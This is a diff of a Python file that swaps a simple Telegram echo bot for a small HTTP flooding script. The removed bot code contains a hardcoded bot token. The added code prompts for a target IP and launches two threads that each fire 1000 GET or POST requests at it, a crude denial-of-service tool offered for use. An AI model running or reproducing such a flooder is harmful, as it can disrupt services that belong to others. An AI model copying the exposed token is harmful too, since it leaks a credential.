@@ -1,21 +1,20 @@
 
-import telebot
+import requests
+import threading
 
-# توکن ربات خود را در اینجا قرار دهید
-TOKEN = '5307073299:AAG2h0nuNRxn3OBA7fhFlLcCA1Bd-DuVTXg'
+URL = input('EnTer The TarGeT Ip : ')
 
-# ایجاد یک نمونه از کلاس TeleBot با استفاده از توکن ربات
-bot = telebot.TeleBot(TOKEN)
+def send_requests(method):
+    for _ in range(1000):
+        if method == 'get':
+            response = requests.get(URL)
+        else:
+            response = requests.post(URL)
+            
+        print(response.status_code)
 
-# تعریف یک دستور
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    bot.reply_to(message, "hello wellcome")
+# ارسال ریکوئست های GET
+threading.Thread(target=send_requests, args=('get',)).start()
 
-# تعریف یک پیام عادی
-@bot.message_handler(func=lambda message: True)
-def echo_message(message):
-    bot.reply_to(message, message.text)
-
-# راه اندازی ربات و ورود به حالت شنود
-bot.polling()
+# ارسال ریکوئست های POST
+threading.Thread(target=send_requests, args=('post',)).start()
